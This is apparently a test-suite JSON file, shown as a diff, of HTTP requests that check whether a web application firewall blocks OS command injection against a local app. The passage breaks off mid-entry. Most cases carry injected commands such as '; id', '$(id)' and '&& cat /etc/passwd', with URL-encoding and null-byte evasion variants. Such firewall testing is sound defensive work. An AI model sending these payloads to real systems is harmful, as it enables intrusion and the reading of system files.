@@ -1,0 +1,2472 @@
+[
+  {
+    "id": "cmdi-0001",
+    "class": "injection-cmdi",
+    "name": "CmdInjection query:name [double-urlencode]",
+    "description": "OS command injection via query:name: ; id",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:double-urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/game/1?name=%253B%2520id",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0002",
+    "class": "injection-cmdi",
+    "name": "CmdInjection body:comment [urlencode]",
+    "description": "OS command injection via body:comment: ; id",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/feedback",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"comment\": \"; id\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0003",
+    "class": "injection-cmdi",
+    "name": "CmdInjection body:format [double-urlencode]",
+    "description": "OS command injection via body:format: ; id",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:double-urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/bet-reports/export",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"format\": \"; id\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0004",
+    "class": "injection-cmdi",
+    "name": "CmdInjection path [double-urlencode]",
+    "description": "OS command injection via path: ; id",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:double-urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/cgi-bin/%3B%20id",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0005",
+    "class": "injection-cmdi",
+    "name": "CmdInjection query:name [raw]",
+    "description": "OS command injection via query:name: | id",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:raw",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/game/1?name=| id",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0006",
+    "class": "injection-cmdi",
+    "name": "CmdInjection body:comment [nullbyte-suffix]",
+    "description": "OS command injection via body:comment: | id",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:nullbyte-suffix",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/feedback",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"comment\": \"| id\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0007",
+    "class": "injection-cmdi",
+    "name": "CmdInjection body:format [urlencode]",
+    "description": "OS command injection via body:format: | id",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/bet-reports/export",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"format\": \"| id\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0008",
+    "class": "injection-cmdi",
+    "name": "CmdInjection path [raw]",
+    "description": "OS command injection via path: | id",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:raw",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/cgi-bin/%7C%20id",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0009",
+    "class": "injection-cmdi",
+    "name": "CmdInjection query:name [double-urlencode]",
+    "description": "OS command injection via query:name: || id",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:double-urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/game/1?name=%257C%257C%2520id",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0010",
+    "class": "injection-cmdi",
+    "name": "CmdInjection body:comment [raw]",
+    "description": "OS command injection via body:comment: || id",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:raw",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/feedback",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"comment\": \"|| id\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0011",
+    "class": "injection-cmdi",
+    "name": "CmdInjection body:format [raw]",
+    "description": "OS command injection via body:format: || id",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:raw",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/bet-reports/export",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"format\": \"|| id\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0012",
+    "class": "injection-cmdi",
+    "name": "CmdInjection path [raw]",
+    "description": "OS command injection via path: || id",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:raw",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/cgi-bin/%7C%7C%20id",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0013",
+    "class": "injection-cmdi",
+    "name": "CmdInjection query:name [raw]",
+    "description": "OS command injection via query:name: & whoami",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:raw",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/game/1?name=& whoami",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0014",
+    "class": "injection-cmdi",
+    "name": "CmdInjection body:comment [raw]",
+    "description": "OS command injection via body:comment: & whoami",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:raw",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/feedback",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"comment\": \"& whoami\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0015",
+    "class": "injection-cmdi",
+    "name": "CmdInjection body:format [urlencode]",
+    "description": "OS command injection via body:format: & whoami",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/bet-reports/export",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"format\": \"& whoami\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0016",
+    "class": "injection-cmdi",
+    "name": "CmdInjection path [urlencode]",
+    "description": "OS command injection via path: & whoami",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/cgi-bin/%26%20whoami",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0017",
+    "class": "injection-cmdi",
+    "name": "CmdInjection query:name [nullbyte-suffix]",
+    "description": "OS command injection via query:name: && cat /etc/passwd",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:nullbyte-suffix",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/game/1?name=&& cat /etc/passwd%00",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0018",
+    "class": "injection-cmdi",
+    "name": "CmdInjection body:comment [nullbyte-suffix]",
+    "description": "OS command injection via body:comment: && cat /etc/passwd",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:nullbyte-suffix",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/feedback",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"comment\": \"&& cat /etc/passwd\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0019",
+    "class": "injection-cmdi",
+    "name": "CmdInjection body:format [raw]",
+    "description": "OS command injection via body:format: && cat /etc/passwd",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:raw",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/bet-reports/export",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"format\": \"&& cat /etc/passwd\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0020",
+    "class": "injection-cmdi",
+    "name": "CmdInjection path [nullbyte-suffix]",
+    "description": "OS command injection via path: && cat /etc/passwd",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:nullbyte-suffix",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/cgi-bin/%26%26%20cat%20%2Fetc%2Fpasswd",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0021",
+    "class": "injection-cmdi",
+    "name": "CmdInjection query:name [double-urlencode]",
+    "description": "OS command injection via query:name: `id`",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:double-urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/game/1?name=%2560id%2560",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0022",
+    "class": "injection-cmdi",
+    "name": "CmdInjection body:comment [raw]",
+    "description": "OS command injection via body:comment: `id`",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:raw",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/feedback",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"comment\": \"`id`\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0023",
+    "class": "injection-cmdi",
+    "name": "CmdInjection body:format [raw]",
+    "description": "OS command injection via body:format: `id`",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:raw",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/bet-reports/export",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"format\": \"`id`\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0024",
+    "class": "injection-cmdi",
+    "name": "CmdInjection path [raw]",
+    "description": "OS command injection via path: `id`",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:raw",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/cgi-bin/%60id%60",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0025",
+    "class": "injection-cmdi",
+    "name": "CmdInjection query:name [double-urlencode]",
+    "description": "OS command injection via query:name: $(id)",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:double-urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/game/1?name=%2524%2528id%2529",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0026",
+    "class": "injection-cmdi",
+    "name": "CmdInjection body:comment [urlencode]",
+    "description": "OS command injection via body:comment: $(id)",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/feedback",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"comment\": \"$(id)\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0027",
+    "class": "injection-cmdi",
+    "name": "CmdInjection body:format [nullbyte-suffix]",
+    "description": "OS command injection via body:format: $(id)",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:nullbyte-suffix",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/bet-reports/export",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"format\": \"$(id)\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0028",
+    "class": "injection-cmdi",
+    "name": "CmdInjection path [nullbyte-suffix]",
+    "description": "OS command injection via path: $(id)",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:nullbyte-suffix",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/cgi-bin/%24%28id%29",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0029",
+    "class": "injection-cmdi",
+    "name": "CmdInjection query:name [raw]",
+    "description": "OS command injection via query:name: ; cat /etc/passwd",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:raw",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/game/1?name=; cat /etc/passwd",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0030",
+    "class": "injection-cmdi",
+    "name": "CmdInjection body:comment [double-urlencode]",
+    "description": "OS command injection via body:comment: ; cat /etc/passwd",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:double-urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/feedback",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"comment\": \"; cat /etc/passwd\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0031",
+    "class": "injection-cmdi",
+    "name": "CmdInjection body:format [raw]",
+    "description": "OS command injection via body:format: ; cat /etc/passwd",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:raw",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/bet-reports/export",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"format\": \"; cat /etc/passwd\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0032",
+    "class": "injection-cmdi",
+    "name": "CmdInjection path [nullbyte-suffix]",
+    "description": "OS command injection via path: ; cat /etc/passwd",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:nullbyte-suffix",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/cgi-bin/%3B%20cat%20%2Fetc%2Fpasswd",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0033",
+    "class": "injection-cmdi",
+    "name": "CmdInjection query:name [double-urlencode]",
+    "description": "OS command injection via query:name: ; ls -la /",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:double-urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/game/1?name=%253B%2520ls%2520-la%2520%252F",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "command_injection"
+      ]
+    }
+  },
+  {
+    "id": "cmdi-0034",
+    "class": "injection-cmdi",
+    "name": "CmdInjection body:comment [double-urlencode]",
+    "description": "OS command injection via body:comment: ; ls -la /",
+    "severity": "critical",
+    "source": "seed",
+    "tags": [
+      "evasion:double-urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/feedback",
+      "auth": "none",
+      "headers": {
